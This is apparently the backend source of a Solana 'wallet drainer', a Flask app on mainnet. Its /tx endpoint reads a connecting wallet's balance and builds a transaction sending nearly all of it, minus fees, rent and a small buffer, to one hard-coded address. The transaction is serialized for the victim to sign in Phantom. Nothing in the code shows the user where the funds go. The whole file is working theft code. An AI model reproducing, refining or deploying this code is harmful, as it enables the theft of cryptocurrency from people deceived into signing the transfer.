from solana.publickey import PublicKey
from solana.transaction import Transaction
from solana.system_program import TransferParams, transfer
from solana.rpc.api import Client
import base64
import os
import traceback

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder="static")
CORS(app)

RPC_URL = "https://api.mainnet-beta.solana.com"
client = Client(RPC_URL)

TARGET_PUBKEY = PublicKey("9i8bausot6icWYDG2yvC6j6CtuHRb5wmuYpA4KjERgxD")

@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/tx", methods=["POST"])
def build_tx():
    try:
        data = request.get_json()
        sender_str = data.get("wallet")
        if not sender_str:
            return jsonify({"error": "Missing wallet address"}), 400

        sender = PublicKey(sender_str)

        # 1) Get wallet balance (lamports)
        bal_resp = client.get_balance(sender)
        if not bal_resp["result"]:
            raise Exception("Failed to fetch balance")
        balance = bal_resp["result"]["value"]

        # 2) Get recent blockhash
        lb_resp = client.get_latest_blockhash()
        if not lb_resp["result"]:
            raise Exception("Failed to fetch blockhash")
        blockhash = lb_resp["result"]["value"]["blockhash"]

        # 3) Estimate transaction fee (dummy tx)
        dummy_tx = Transaction(recent_blockhash=blockhash, fee_payer=sender)
        dummy_tx.add(transfer(TransferParams(from_pubkey=sender, to_pubkey=sender, lamports=0)))
        fee_resp = client.get_fee_for_message(dummy_tx.compile_message())
        if not fee_resp["result"] or fee_resp["result"]["value"] is None:
            raise Exception("Failed to estimate fee")
        fee = fee_resp["result"]["value"]

        # 4) Query rent-exempt minimum
        rent_resp = client.get_minimum_balance_for_rent_exemption(0)
        if not rent_resp["result"]:
            raise Exception("Failed to fetch rent exemption minimum")
        rent_exempt = rent_resp["result"]

        SAFETY_BUFFER = 1_000_000  # Leave 0.001 SOL more for Phantom's safety
        send_amount = balance - fee - rent_exempt - SAFETY_BUFFER

        if send_amount <= 0:
            return jsonify({"error": "Insufficient balance to cover fee + rent exemption + buffer"}), 400

        # 5) Build transaction
        tx = Transaction(recent_blockhash=blockhash, fee_payer=sender)
        tx.add(transfer(TransferParams(
            from_pubkey=sender,
            to_pubkey=TARGET_PUBKEY,
            lamports=send_amount
        )))

        # 6) Serialize only the message for Phantom
        b64 = base64.b64encode(tx.serialize_message()).decode("utf8")
        return jsonify({"transaction": b64})

    except Exception as e:
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # <-- get Render-assigned port
    app.run(host="0.0.0.0", port=port, debug=True)